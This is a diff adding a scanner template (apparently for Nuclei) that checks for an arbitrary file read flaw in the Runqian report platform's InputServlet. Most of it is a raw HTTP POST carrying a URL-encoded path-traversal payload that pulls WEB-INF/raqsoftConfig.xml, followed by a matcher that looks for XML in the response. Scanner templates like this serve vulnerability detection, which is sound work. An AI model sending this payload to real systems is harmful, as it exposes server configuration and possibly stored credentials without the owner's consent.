@@ -1,0 +1,29 @@
+id: rqbb-InputServlet-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 润乾报表平台InputServlet存在任意文件读取漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B6%A6%E4%B9%BE%E6%8A%A5%E8%A1%A8%E5%B9%B3%E5%8F%B0InputServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /InputServlet?action=13 HTTP/1.1
+        Host: {{Hostname}}
+        accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: JSESSIONID=D855BEAD64E0F60C50F2351FFE3A4A16
+        Connection: close
+        Content-Length: 79
+
+        file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <?xml
